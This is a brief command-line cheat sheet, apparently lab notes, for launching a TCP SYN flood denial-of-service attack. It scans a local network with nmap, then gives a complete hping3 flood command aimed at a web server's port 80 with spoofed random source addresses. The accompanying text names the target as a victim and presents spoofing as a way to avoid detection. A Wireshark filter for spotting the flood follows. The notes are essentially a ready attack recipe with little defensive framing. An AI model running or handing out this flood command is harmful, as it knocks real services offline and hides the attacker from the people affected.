#windows firewall should be turned off to detect available IP addesses using nmap

#can be done in local area network

nmap 192.168.0.0/24

#detect which IP addresses are available and open ports indicate they have firewall closed

sudo apt-get install hping3

hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.159

#We’re sending 15000 packets (-c 15000) at a size of 120 bytes (-d 120) each. We’re specifying that the SYN Flag (-S) should be enabled, with a TCP window size of 64 (-w 64). To direct the attack to our victum’s HTTP web server we specify port 80 (-p 80) and use the --flood flag to send packets as fast as possible. As you’d expect, the --rand-source flag generates spoofed IP addresses to disguise the real source and avoid detection but at the same time stop the victim’s SYN-ACK reply packets from reaching the attacker.


#detect huge tcp packets in wireshark using this filter

 tcp.flags.syn == 1 and tcp.flags.ack == 0


#for code 

https://github.com/antirez/hping
